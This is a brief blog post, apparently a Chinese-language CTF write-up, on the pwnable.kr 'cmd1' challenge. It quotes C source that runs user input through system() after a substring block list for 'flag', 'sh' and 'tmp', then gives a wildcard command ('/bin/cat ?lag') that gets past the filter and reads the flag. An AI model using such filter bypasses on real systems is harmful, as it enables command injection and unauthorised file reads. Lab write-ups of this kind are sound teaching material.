<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Pwnable Cmd1 | Limpidity</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="shortcut icon" href="/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>
<nav class="navbar">
    <div class="layout">
        <div class="content ">
            
            
            <a href="/.">Home</a>
            
            
            
            <a href="/archives">Archive</a>
            
            
        </div>
    </div>
</nav>

<main class="post">
    <article>
    <h1 class="article-title">
        <a href="/2017/09/23/cmd1/">Pwnable Cmd1</a>
    </h1>

    <section class="article-meta">
        <p class="article-date">September 23 2017</p>
    </section>

    <section class="article-entry">
        <pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, &quot;flag&quot;)!=0;
    r += strstr(cmd, &quot;sh&quot;)!=0;
    r += strstr(cmd, &quot;tmp&quot;)!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv(&quot;PATH=/fuckyouverymuch&quot;);
    if(filter(argv[1])) return 0;
    system( argv[1] );
    return 0;
}
</code></pre><p>源码是这样，<code>filter</code>函数中有个<code>strstr</code>函数，这个函数搜索一个字符串在另一个字符串中的第一次出现，若存在，则返回子串在字符串中首次出现的位置，若不存在返回NULL。所以只要<code>argv</code>中不出现<code>flag</code>,<code>sh</code>,<code>tmp</code>字符串则会执行<code>system</code>,所以构造命令：<code>./cmd1 &quot;/bin/cat ?lag</code></p>

    </section>
</article>

</main>
<footer class="footer">
    <p>Powered by Moren YANG&nbsp;&nbsp;-&nbsp;&nbsp;ackn. <a href="https://hexo.io"> Hexo </a></p>
</footer>

</body>
</html>
